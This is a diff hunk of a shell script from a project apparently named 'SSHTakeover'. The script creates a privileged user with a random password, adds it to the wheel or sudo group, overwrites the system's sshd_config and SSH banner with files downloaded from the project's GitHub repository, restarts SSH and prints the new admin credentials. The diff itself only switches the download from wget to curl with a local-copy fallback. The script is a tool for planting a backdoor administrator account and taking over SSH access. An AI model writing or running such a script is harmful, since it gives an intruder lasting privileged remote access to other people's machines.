@@ -13,8 +13,8 @@ echo $random_user:$random_number | chpasswd;
 if [ -f /usr/bin/yum ]; then usermod -aG wheel  . $random_user . ; fi;
 if [ -f /usr/bin/apt ]; then usermod -g sudo $random_user; fi;
 echo Configuring SSH...;
-wget -O /etc/ssh/sshd_banner https://github.com/ind3p3nd3nt/SSHTakeover/raw/master/sshd_banner
-wget -O /etc/ssh/sshd_config https://github.com/ind3p3nd3nt/SSHTakeover/raw/master/sshd_config
+if [ ! -f ./sshd_banner ]; then curl -v https://github.com/ind3p3nd3nt/SSHTakeover/raw/master/sshd_banner -o /etc/ssh/sshd_banner; else cp -r ./sshd_banner /etc/ssh/sshd_banner; fi;
+if [ ! -f ./sshd_config ]; then curl -v https://github.com/ind3p3nd3nt/SSHTakeover/raw/master/sshd_config -o /etc/ssh/sshd_config; else cp -r ./sshd_config /etc/ssh/sshd_config; fi;
 if [ -f /usr/bin/yum ]; then service sshd restart; fi;
 if [ -f /usr/bin/apt ]; then service ssh restart; fi;
 arr4y="Added admin:, $random_user, password:, $random_number, Start SSHd with: sudo service ssh start (debian) or sudo service sshd start (centos)";
